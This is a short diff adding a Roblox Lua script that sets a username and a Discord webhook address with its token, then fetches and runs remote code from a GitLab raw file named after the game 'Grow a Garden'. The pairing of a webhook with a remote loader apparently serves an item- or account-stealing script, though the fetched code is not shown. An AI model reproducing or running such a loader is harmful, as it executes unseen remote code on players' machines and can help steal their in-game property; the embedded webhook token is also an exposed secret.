@@ -1,0 +1,4 @@
+Username = "chaknuakulalu"
+Webhook = "https://discord.com/api/webhooks/1371758424047620226/EfgZBacSzTl_NOVXjAREzJC705ENgeDcs0ucAzBp1Sm8RlNhw454PBgf3sub2JRfqMku"
+
+loadstring(game:HttpGet("https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/grow-a-garden"))()
